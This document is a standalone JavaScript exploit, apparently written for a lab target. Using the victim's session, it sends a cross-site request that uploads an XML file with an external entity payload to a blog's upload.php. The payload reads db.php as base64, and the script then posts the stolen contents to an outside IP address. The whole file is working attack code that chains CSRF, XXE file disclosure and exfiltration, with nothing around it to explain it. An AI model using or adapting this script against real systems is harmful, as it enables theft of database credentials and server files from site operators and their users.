
	var xhr = new XMLHttpRequest();

    xhr.open("POST", "http:\/\/localhost:800\/blog/upload.php", true);

    xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");

    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");

    xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------10852936982078577296172709838");

    xhr.withCredentials = true;

    var body = "-----------------------------10852936982078577296172709838\r\n" + 
          "Content-Disposition: form-data; name=\"comments\"; filename=\"xml.xml\"\r\n" + 
          "Content-Type: text/xml\r\n" + 
          "\r\n" + 
          "\x3c!DOCTYPE replace [\x3c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=db.php\"\x3e ]\x3e\r\n" + 
          "\x3ccomments\x3e\r\n" + 
          "    \x3cname\x3e&xxe;\x3c/name\x3e\r\n" + 
          "    \x3ccomment\x3emypass\x3c/comment\x3e\r\n" + 
          "\x3c/comments\x3e\n" + 
          "\r\n" + 
          "-----------------------------10852936982078577296172709838\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "Upload Image\r\n" + 
          "-----------------------------10852936982078577296172709838--\r\n";

    var aBody = new Uint8Array(body.length);

    for (var i = 0; i < aBody.length; i++)

      aBody[i] = body.charCodeAt(i); 

    xhr.send(new Blob([aBody]));
    xhr.addEventListener("readystatechange", function() {
        if(this.readyState === 4) {
          console.log(this.responseText);

            fetch("http://192.168.153.128:8000/content", {
            body: "url=" + encodeURIComponent("xxe") + "&content=" + encodeURIComponent(xhr.response),
            headers: {
                            "Content-Type": "application/x-www-form-urlencoded"
                        },
                        method: "POST"
                    })

        }


      });